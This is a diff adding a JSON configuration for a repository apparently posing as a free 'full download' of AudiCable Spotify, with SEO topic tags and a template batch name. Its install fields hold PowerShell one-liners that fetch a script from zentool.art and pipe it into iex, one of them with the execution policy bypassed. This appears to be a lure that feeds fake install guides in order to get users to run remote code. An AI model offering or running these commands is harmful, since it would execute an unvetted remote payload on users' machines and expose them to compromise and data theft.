@@ -1,0 +1,31 @@
+{
+  "repo": "AudiCable-Spotify-Full-Download",
+  "product": "AudiCable Spotify Full Download",
+  "product_title": "AudiCable Spotify",
+  "kind": "media",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "audicable-spotify",
+    "audicable-spotify-windows",
+    "audicable-spotify-desktop",
+    "audicable",
+    "spotify",
+    "audio-editing",
+    "music-production",
+    "daw-plugin",
+    "mixing-tools",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop",
+    "software-documentation"
+  ],
+  "site": "zentool.art"
+}
